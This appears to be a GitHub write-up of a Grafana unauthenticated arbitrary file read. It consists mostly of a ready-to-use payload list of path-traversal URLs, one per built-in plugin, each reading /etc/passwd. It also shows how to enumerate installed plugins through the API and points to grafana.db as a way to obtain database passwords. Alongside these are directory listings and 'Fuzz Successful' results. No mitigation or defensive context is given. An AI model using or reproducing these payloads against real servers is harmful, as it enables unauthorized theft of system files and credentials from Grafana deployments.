# Grafana Unauthorized arbitrary file reading vulnerability

Example: get db password

`/var/lib/grafana/grafana.db`

![image](https://user-images.githubusercontent.com/16593068/145001684-85358acc-bc3a-4620-89f7-9a07eba98a4f.png)


```
Default plugins count: 40
Successful count: 48
```


```
/public/plugins/alertGroups/../../../../../../../../etc/passwd
/public/plugins/alertlist/../../../../../../../../etc/passwd
/public/plugins/alertmanager/../../../../../../../../etc/passwd
/public/plugins/annolist/../../../../../../../../etc/passwd
/public/plugins/barchart/../../../../../../../../etc/passwd
/public/plugins/bargauge/../../../../../../../../etc/passwd
/public/plugins/canvas/../../../../../../../../etc/passwd
/public/plugins/cloudwatch/../../../../../../../../etc/passwd
/public/plugins/dashboard/../../../../../../../../etc/passwd
/public/plugins/dashlist/../../../../../../../../etc/passwd
/public/plugins/debug/../../../../../../../../etc/passwd
/public/plugins/elasticsearch/../../../../../../../../etc/passwd
/public/plugins/gauge/../../../../../../../../etc/passwd
/public/plugins/geomap/../../../../../../../../etc/passwd
/public/plugins/gettingstarted/../../../../../../../../etc/passwd
/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd
/public/plugins/grafana/../../../../../../../../etc/passwd
/public/plugins/graph/../../../../../../../../etc/passwd
/public/plugins/graphite/../../../../../../../../etc/passwd
/public/plugins/heatmap/../../../../../../../../etc/passwd
/public/plugins/histogram/../../../../../../../../etc/passwd
/public/plugins/influxdb/../../../../../../../../etc/passwd
/public/plugins/jaeger/../../../../../../../../etc/passwd
/public/plugins/live/../../../../../../../../etc/passwd
/public/plugins/logs/../../../../../../../../etc/passwd
/public/plugins/loki/../../../../../../../../etc/passwd
/public/plugins/mixed/../../../../../../../../etc/passwd
/public/plugins/mssql/../../../../../../../../etc/passwd
/public/plugins/mysql/../../../../../../../../etc/passwd
/public/plugins/news/../../../../../../../../etc/passwd
/public/plugins/nodeGraph/../../../../../../../../etc/passwd
/public/plugins/opentsdb/../../../../../../../../etc/passwd
/public/plugins/piechart/../../../../../../../../etc/passwd
/public/plugins/pluginlist/../../../../../../../../etc/passwd
/public/plugins/postgres/../../../../../../../../etc/passwd
/public/plugins/prometheus/../../../../../../../../etc/passwd
/public/plugins/stat/../../../../../../../../etc/passwd
/public/plugins/state-timeline/../../../../../../../../etc/passwd
/public/plugins/status-history/../../../../../../../../etc/passwd
/public/plugins/table-old/../../../../../../../../etc/passwd
/public/plugins/table/../../../../../../../../etc/passwd
/public/plugins/tempo/../../../../../../../../etc/passwd
/public/plugins/testdata/../../../../../../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd
/public/plugins/timeseries/../../../../../../../../etc/passwd
/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/xychart/../../../../../../../../etc/passwd
/public/plugins/zipkin/../../../../../../../../etc/passwd
```

# 0x0 Default plugins installed (40) list:

http://x.x.x.x:3000/api/plugins?embedded=0

```
alertlist
annolist
grafana-azure-monitor-datasource
barchart
bargauge
cloudwatch
dashlist
elasticsearch
gauge
geomap
gettingstarted
stackdriver
graph
graphite
heatmap
histogram
influxdb
jaeger
logs
loki
mssql
mysql
news
nodeGraph
opentsdb
piechart
pluginlist
postgres
prometheus
stat
state-timeline
status-history
table
table-old
tempo
testdata
text
timeseries
welcome
zipkin
```
![image](https://user-images.githubusercontent.com/16593068/144999119-26b04c63-e8bc-49f6-9fc4-c05a8f41d585.png)

# 0x01 /usr/share/grafana/public/app/plugins/datasource ( 21)

```
/usr/share/grafana/public/app/plugins/datasource

bash-5.1$ ls -l
drwxr-xr-x    3 root     root          4096 Oct  7 10:55 alertmanager
drwxr-xr-x    7 root     root          4096 Oct  7 10:55 cloud-monitoring
drwxr-xr-x    8 root     root          4096 Oct  7 10:55 cloudwatch
drwxr-xr-x    2 root     root          4096 Oct  7 10:55 dashboard
drwxr-xr-x    9 root     root          4096 Oct  7 10:55 elasticsearch
drwxr-xr-x    3 root     root          4096 Oct  7 10:55 grafana
drwxr-xr-x   19 root     root          4096 Oct  7 10:55 grafana-azure-monitor-datasource
drwxr-xr-x    9 root     root          4096 Oct  7 10:55 graphite
drwxr-xr-x    6 root     root          4096 Oct  7 10:55 influxdb
drwxr-xr-x    4 root     root          4096 Oct  7 10:55 jaeger
drwxr-xr-x    7 root     root          4096 Oct  7 10:55 loki
drwxr-xr-x    2 root     root          4096 Oct  7 10:55 mixed
drwxr-xr-x    5 root     root          4096 Oct  7 10:55 mssql
drwxr-xr-x    5 root     root          4096 Oct  7 10:55 mysql
drwxr-xr-x    6 root     root          4096 Oct  7 10:55 opentsdb
drwxr-xr-x    5 root     root          4096 Oct  7 10:55 postgres
drwxr-xr-x    7 root     root          4096 Oct  7 10:55 prometheus
drwxr-xr-x    4 root     root          4096 Oct  7 10:55 tempo
drwxr-xr-x    7 root     root          4096 Oct  7 10:55 testdata
drwxr-xr-x    4 root     root          4096 Oct  7 10:55 zipkin
```
Fuzz Successful!
<img width="938" alt="image-20211207165332908" src="https://user-images.githubusercontent.com/16593068/144999319-d999d749-5afd-4bd6-bb39-559e96cd48bc.png">

```
/public/plugins/alertmanager/../../../../../../../../etc/passwd
/public/plugins/cloudwatch/../../../../../../../../etc/passwd
/public/plugins/dashboard/../../../../../../../../etc/passwd
/public/plugins/elasticsearch/../../../../../../../../etc/passwd
/public/plugins/grafana/../../../../../../../../etc/passwd
/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd
/public/plugins/graphite/../../../../../../../../etc/passwd
/public/plugins/influxdb/../../../../../../../../etc/passwd
/public/plugins/jaeger/../../../../../../../../etc/passwd
/public/plugins/loki/../../../../../../../../etc/passwd
/public/plugins/mixed/../../../../../../../../etc/passwd
/public/plugins/mssql/../../../../../../../../etc/passwd
/public/plugins/mysql/../../../../../../../../etc/passwd
/public/plugins/opentsdb/../../../../../../../../etc/passwd
/public/plugins/postgres/../../../../../../../../etc/passwd
/public/plugins/prometheus/../../../../../../../../etc/passwd
/public/plugins/tempo/../../../../../../../../etc/passwd
/public/plugins/testdata/../../../../../../../../etc/passwd
/public/plugins/zipkin/../../../../../../../../etc/passwd
```

# 0x02 /usr/share/grafana/public/app/plugins/ (29)

```
/usr/share/grafana/public/app/plugins/panel/

drwxr-xr-x    2 root     root        4.0K Oct  7 10:55 alertGroups
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 alertlist
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 annolist
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 barchart
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 bargauge
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 canvas
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 dashlist
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 debug
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 gauge
drwxr-xr-x    8 root     root        4.0K Oct  7 10:55 geomap
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 gettingstarted
drwxr-xr-x    5 root     root        4.0K Oct  7 10:55 graph
drwxr-xr-x    5 root     root        4.0K Oct  7 10:55 heatmap
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 histogram
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 live
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 logs
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 news
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 nodeGraph
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 piechart
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 pluginlist
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 stat
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 state-timeline
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 status-history
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 table
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 table-old
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 text
drwxr-xr-x    6 root     root        4.0K Oct  7 10:55 timeseries
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 welcome
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 xychart
```
<img width="903" alt="image-20211207170001125" src="https://user-images.githubusercontent.com/16593068/144999499-1b152ebc-c678-463f-bfe5-116a8d77656b.png">

Fuzz Success

```
/public/plugins/alertGroups/../../../../../../../../etc/passwd
/public/plugins/alertlist/../../../../../../../../etc/passwd
/public/plugins/annolist/../../../../../../../../etc/passwd
/public/plugins/barchart/../../../../../../../../etc/passwd
/public/plugins/bargauge/../../../../../../../../etc/passwd
/public/plugins/canvas/../../../../../../../../etc/passwd
/public/plugins/dashlist/../../../../../../../../etc/passwd
/public/plugins/debug/../../../../../../../../etc/passwd
/public/plugins/gauge/../../../../../../../../etc/passwd
/public/plugins/geomap/../../../../../../../../etc/passwd
/public/plugins/gettingstarted/../../../../../../../../etc/passwd
/public/plugins/graph/../../../../../../../../etc/passwd
/public/plugins/heatmap/../../../../../../../../etc/passwd
/public/plugins/histogram/../../../../../../../../etc/passwd
/public/plugins/live/../../../../../../../../etc/passwd
/public/plugins/logs/../../../../../../../../etc/passwd
/public/plugins/news/../../../../../../../../etc/passwd
/public/plugins/nodeGraph/../../../../../../../../etc/passwd
/public/plugins/piechart/../../../../../../../../etc/passwd
/public/plugins/pluginlist/../../../../../../../../etc/passwd
/public/plugins/stat/../../../../../../../../etc/passwd
/public/plugins/state-timeline/../../../../../../../../etc/passwd
/public/plugins/status-history/../../../../../../../../etc/passwd
/public/plugins/table/../../../../../../../../etc/passwd
/public/plugins/table-old/../../../../../../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd
/public/plugins/timeseries/../../../../../../../../etc/passwd
/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/xychart/../../../../../../../../etc/passwd
```

